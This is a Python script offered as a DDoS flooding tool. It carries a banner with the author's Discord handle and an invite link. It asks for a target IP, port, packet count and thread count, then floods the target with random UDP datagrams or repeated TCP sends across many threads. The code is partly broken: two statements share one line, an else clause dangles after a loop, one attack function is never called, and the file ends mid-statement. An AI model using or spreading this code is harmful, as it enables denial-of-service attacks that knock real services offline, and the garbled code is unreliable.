import random

import socket

import threading

print       (" >> TOOLS CREATED BY  Exe`Jacob <<")

print       (" >> DISCORD : Jaecob#6348 << ")

print       (">> DON'T ABUSE MY TOOLS <<")                                   

print       (" >> DM ME IF YOU NEED HELP <<")

print       (" >> JOIN OUR COMMUNITY AND LEARN TOGETHER<<")

print       (" >> https://discord.gg/DWA38YChSy <<")

ip = str(input("  HOST/IP:"))

port = int(input(" Port:"))

choice = str(input(" i ddos moba or hindi tanga (y/n):"))

times = int(input(" Packets:"))

threads = int(input(" Threads:"))

def run():

	data = random._urandom(1000)	i = random.choice(("[+]","[-]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

			addr = (str(ip),int(port))

			for x in range(times):

				s.sendto(data,addr)

			print(i +" JACOB ATTACK THE SERVER")

		except:

			print("[!] ERROR SERVER TIME OUT")

def run2():

	data = random._urandom(16)

	i = random.choice(("[*]","[!]","[#]"))

	while True:

		try:

			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

			s.connect((ip,port))

			s.send(data)

			for x in range(times):

				s.send(data)

			print(i +" JACOB ATTACK THE SERVER ")

		except:

			s.close()

			print("[*] ERROR SERVER TIME OUT")

for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

	if choice == 'y':

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

else:

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)

		th.start()

		th = threading.Thread(target = run)
